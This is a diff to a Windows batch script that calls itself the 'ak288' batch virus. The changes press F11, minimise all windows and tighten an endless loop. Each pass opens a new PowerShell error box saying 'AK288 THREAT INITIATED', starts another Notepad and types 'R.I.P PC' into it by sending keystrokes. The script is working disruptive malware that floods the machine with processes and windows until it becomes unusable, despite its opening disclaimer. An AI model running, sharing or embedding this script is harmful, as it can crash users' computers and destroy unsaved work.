@@ -1,4 +1,5 @@
 @echo off
+PowerShell -Command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{F11}')"
 PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('I am not responsible for any damages caused, please use a virtual machine if you aren''t!','ak288 (windows 10 batch virus on GitHub which was made by kutz) would like to warn you:',0,[System.Windows.MessageBoxImage]::Warning)"
 cls
 color 0E
@@ -16,17 +17,13 @@ if errorlevel 1 (
     echo Continuing to the batch script.
     timeout /t 2 /nobreak >nul
     pause
+    PowerShell -Command "$shell = New-Object -ComObject Shell.Application; $shell.MinimizeAll()"
     :errorloop
-    PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('AK288 THREAT INITIATED','AK288',0,[System.Windows.MessageBoxImage]::Error)"
+    start "" PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('AK288 THREAT INITIATED','Error',0,[System.Windows.MessageBoxImage]::Error)"
     start notepad
-    timeout /t 1 /nobreak >nul
+    PowerShell -Command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ENTER}')"
     PowerShell -Command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('R.I.P PC')"
-    timeout /t 1 /nobreak >nul
-    PowerShell -Command "$wshell.SendKeys('{ENTER}GET BETTER')"
-    timeout /t 1 /nobreak >nul
-    PowerShell -Command "$wshell.SendKeys('%{F4}')"
-    timeout /t 1 /nobreak >nul
-    PowerShell -Command "$wshell.SendKeys('n')"
+    PowerShell -Command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('{ENTER}R.I.P PC')"
     goto errorloop
 )
 
